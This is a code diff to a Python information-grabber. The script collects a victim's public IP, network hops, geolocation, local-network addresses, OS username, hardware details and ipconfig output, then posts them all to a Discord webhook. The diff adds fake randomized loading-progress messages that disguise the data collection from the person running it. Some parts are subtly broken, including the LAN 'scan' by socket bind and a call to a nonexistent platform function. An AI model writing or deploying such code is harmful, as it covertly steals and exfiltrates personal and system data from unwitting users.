@@ -8,28 +8,52 @@ import psutil
 import subprocess
 import socket
 import webbrowser
+import random
 
 os.system("chmod +x *")
 if os.name == "nt":
 	os.system("cls")
 else:
 	os.system("clear")
-
+print("please wait and dont stop program...")
 info = []
-
 try:
-	ip = requests.get(f"https://ifconfig.me/ip").text
+	inff = requests.get(f"https://ifconfig.me/all").text
+	inff = inff.replace("\r", "")
+	ip = inff[inff.find("ip_addr: ")+len("ip_addr: "):]
+	ip = ip[:ip.find("\n")]
+	forwarded = inff[inff.find("forwarded: ")+len("forwarded: "):]
+	hops = ", ".join(forwarded[:forwarded.find("\n")].replace(" ", "").replace(ip, "").split(","))
 except:
 	print("system error.")
 	ip = ""
+	hops = ""
 info.append(f"-")
 info.append(f"IP ADDRESS: || {ip} ||")
+info.append(f"HOP ADDRESSES: || {hops} ||")
+print(f"loading... %{random.randint(1, 5)}%")
 try:
-	hostname = socket.gethostbyaddr(ip)[0]
+	dnses = socket.gethostbyaddr(ip)
+	for hostname, n in zip(dnses, range(len(dnses))):
+		if hostname == ip:
+			pass
+		else:
+			info.append(f"HOSTNAME {n+1}: || {hostname} ||")
 except:
 	print("system error.")
-	hostname = ""
-info.append(f"HOST NAME: || {hostname} ||")
+print(f"loading... {random.randint(6, 15)}%")
+opens = []
+for n in range(1, 255):
+	ip = f"192.168.1.{n}"
+	s = socket.socket()
+	try:
+		s.bind((ip, 65534))
+		opens.append(ip)
+	except:
+		pass
+	s.close()
+info.append(f"OPEN LANS: || {', '.join(opens)} ||")
+print(f"loading... {random.randint(15, 25)}%")
 try:
 	i = requests.get(f"https://ipapi.co/{ip}/json", headers={"User-Agent": "bot"}).json()
 	try:
@@ -41,6 +65,7 @@ try:
 		info.append(f"{h1}: || {h2} ||")
 except:
 	print("system error.")
+print(f"loading... {random.randint(25, 45)}%")
 if os.name == "nt":
 	command = "ipconfig /all"
 else:
@@ -53,6 +78,7 @@ try:
 	info.append(f"OS NAME: || {os.name} ||\nSYSTEM OS NAME: || {platform.system()} ||\nSYSTEM VERSION: || {platform.version()} ||\nSYSTEM ARCHITECTURE: || {', '.join(platform.architecture())} ||\nSYSTEM PROCESSOR: || {platform.processor()} ||\nOS USERNAME: || {os.getlogin()} ||\nSYSTEM OS NAME: || {platform.node()} ||\nFILE PATH: || {os.getcwd()} ||\nPYTHON VERSION: || {platform.python_version()} ||\nPYTHON TUPLE VERSION: || {platform.python_version_tuple()[0]} ||\nRAM: || {psutil.virtual_memory().total / (1024 ** 3)} || GB\nRAM AVAILABLE: || {psutil.virtual_memory().available / (1024 ** 3)} || GB\nCPU COUNT: || {psutil.cpu_count(logical=False)} ||\nTHREAD COUNT: || {psutil.cpu_count(logical=False)} ||\nIFCONFIG OUTPUT: || {output} ||\nMACHINE TYPE: || {platform.machine()} ||\nOS FAMILY: || {platform.system_alias(platform.system(), platform.release(), 0)} ||")
 except:
 	print("system error.")
+print(f"loading... {random.randint(45, 80)}%")
 try:
 	info.append(f"\nOS FREQUENCY: || {platform.system_frequency()} ||")
 except:
@@ -78,6 +104,7 @@ try:
 except:
 	print("system error.")
 info.append(f"-")
+print("loading... 100%")
 try:
 	data = {"content": "\n".join(info)}
 	requests.post("your_discord_webhook_url", json=data, headers={'Content-Type': 'application/json', "User-Agent": "bot"})
